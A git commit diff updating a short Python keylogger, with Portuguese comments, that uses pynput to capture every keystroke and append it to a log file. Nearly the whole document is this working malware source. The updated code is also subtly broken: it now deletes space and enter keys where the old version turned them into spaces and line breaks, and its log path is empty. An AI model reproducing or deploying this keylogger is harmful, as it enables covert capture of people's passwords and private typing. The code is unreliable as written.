a363e1b67a949991ce6434e11f8c46d93c17d150
Erik Alves <85678826+KiRaz-rmdir@users.noreply.github.com>
2023-03-13 00:26:19 -0300

    Update Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -1,17 +1,18 @@
-from pynput.keyboard import Listener ##importando modulo listener - para 'ouvir' a captura das teclas
-import re ##importando biblioteca - regular expression 
+from pynput.keyboard import Listener # Importa a biblioteca Listener do pynput.keyboard para capturar as teclas pressionadas
+import re # Importa a biblioteca re para usar expressões regulares
 
-file_log = "" ##caminho do arquivo .log
+file_log = "" # Caminho do arquivo de log que armazenará as teclas capturadas
+clean_chars = ["'", "Key.space", "Key.enter"] # Lista de caracteres que serão removidos das teclas capturadas
 
-def capture(keycap):  ##funcao para regular expressoes do log 
-    keycap = str(keycap) ##convertendo teclas em string
-    keycap = re.sub(r"\'", "",keycap) ##removendo aspas da output
-    keycap = re.sub(r"Key.space", " ",keycap)##removendo da output 'key.space' para literalmente um 'space' no log
-    keycap = re.sub(r"Key.enter", "\n",keycap)##removendo output 'key.enter' para uma quebra de linha '\n'
-    keycap = re.sub(r"Key.*", '',keycap)##removendo todas funcoes restante do log - clean log 
-    
-    with open(file_log, "a") as log: ##funcao para escrever as teclas no arquivo de log
-        log.write(keycap)
+# Função que captura as teclas pressionadas pelo usuário e as processa
+def capture(keycap):
+    keycap = str(keycap).strip('()') # Remove os parênteses que envolvem as teclas capturadas
+    for char in clean_chars:
+        keycap = keycap.replace(char, '') # Remove os caracteres especificados na lista "clean_chars"
+    keycap = re.sub(r'Key\..*', '', keycap) # Remove qualquer outro prefixo 'Key.' usando expressões regulares
+    with open(file_log, "a") as log:
+        log.write(keycap) # Escreve a tecla processada no arquivo de log
 
-with Listener(on_press=capture) as l: 
-    l.join()    
+# Usa a função Listener para capturar as teclas pressionadas e chama a função "capture" para processá-las
+with Listener(on_press=capture) as l:
+    l.join() # Mantém o programa em execução até que seja interrompido manualmente
